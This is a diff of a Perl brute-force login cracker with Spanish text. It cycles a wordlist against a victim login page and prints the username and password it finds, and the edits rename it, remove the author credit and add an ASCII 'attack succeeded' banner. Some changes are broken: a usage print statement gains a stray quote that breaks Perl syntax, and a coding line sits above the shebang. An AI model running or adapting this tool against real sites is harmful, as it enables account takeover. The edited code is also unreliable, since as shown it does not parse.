@@ -1,9 +1,6 @@
+# -*- coding: utf-8 -*-
 #!/bin/perl
 
-# APP_NAME: Bruter
-# DESCRIPCIÓN: Código de ataque por fuerza bruta a logins de sitios web 
-# AUTOR: IronBit Stark
-# E-MAIL: ironbit@rocketmail.com
 
 use strict;
 use LWP::UserAgent;
@@ -11,8 +8,8 @@ use LWP::UserAgent;
  
 if ($#ARGV < 1)
 {
-	print "\nUso: perl Bruter [URL] [DICCIONARIO]\n";
-	print "Ej.: perl Bruter www.victima.com/login.php 'wordlist.ibs'\n\n";
+	print "\nUso: perl FB [URL] [DICCIONARIO]\n";
+	print "Ej.: perl FB---> INICIO DE SESION INCORRECTO <---" www.victima.com/login.php 'wordlist.ibs'\n\n";
 	exit();
 }
  
@@ -46,16 +43,25 @@ foreach(@dic)
 		
 		if ($respuesta !~ /ACCESO DENEGADO/)
 		{
-			print "\n\n=======================\n";
-			print "|> ¡Ataque exitoso!  <|\n";
-			print "=======================\n";
+print "			                                                                                               ";
+print " ▄▄▄     ▄▄▄█████▓ ▄▄▄        █████   █    ██ ▓█████    ▓█████ ▒██   ██▒ ██▓▄▄▄█████▓ ▒█████    ██████  ▒█████  ";
+print "▒████▄   ▓  ██▒ ▓▒▒████▄    ▒██▓  ██▒ ██  ▓██▒▓█   ▀    ▓█   ▀ ▒▒ █ █ ▒░▓██▒▓  ██▒ ▓▒▒██▒  ██▒▒██    ▒ ▒██▒  ██▒";
+print "▒██  ▀█▄ ▒ ▓██░ ▒░▒██  ▀█▄  ▒██▒  ██░▓██  ▒██░▒███      ▒███   ░░  █   ░▒██▒▒ ▓██░ ▒░▒██░  ██▒░ ▓██▄   ▒██░  ██▒";
+print "░██▄▄▄▄██░ ▓██▓ ░ ░██▄▄▄▄██ ░██  █▀ ░▓▓█  ░██░▒▓█  ▄    ▒▓█  ▄  ░ █ █ ▒ ░██░░ ▓██▓ ░ ▒██   ██░  ▒   ██▒▒██   ██░";
+print " ▓█   ▓██▒ ▒██▒ ░  ▓█   ▓██▒░▒███▒█▄ ▒▒█████▓ ░▒████▒   ░▒████▒▒██▒ ▒██▒░██░  ▒██▒ ░ ░ ████▓▒░▒██████▒▒░ ████▓▒░";
+print " ▒▒   ▓▒█░ ▒ ░░    ▒▒   ▓▒█░░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒ ░░ ▒░ ░   ░░ ▒░ ░▒▒ ░ ░▓ ░░▓    ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ";
+print "  ▒   ▒▒ ░   ░      ▒   ▒▒ ░ ░ ▒░  ░ ░░▒░ ░ ░  ░ ░  ░    ░ ░  ░░░   ░▒ ░ ▒ ░    ░      ░ ▒ ▒░ ░ ░▒  ░ ░  ░ ▒ ▒░ ";
+print "  ░   ▒    ░        ░   ▒      ░   ░  ░░░ ░ ░    ░         ░    ░    ░   ▒ ░  ░      ░ ░ ░ ▒  ░  ░  ░  ░ ░ ░ ▒  ";
+print "      ░  ░              ░  ░    ░       ░        ░  ░      ░  ░ ░    ░   ░               ░ ░        ░      ░ ░  ";
+                                                                                                                
+                        print "=======================\n\n";
 			print " Usuario:\t$usuario\n Password:\t$password\n";
 			print "=======================\n\n";
 			exit();
 		}
 		else
 		{
-			print "...... Descartado";
+			print "---> INICIO DE SESION INCORRECTO <---";
 		}
 	}
 }
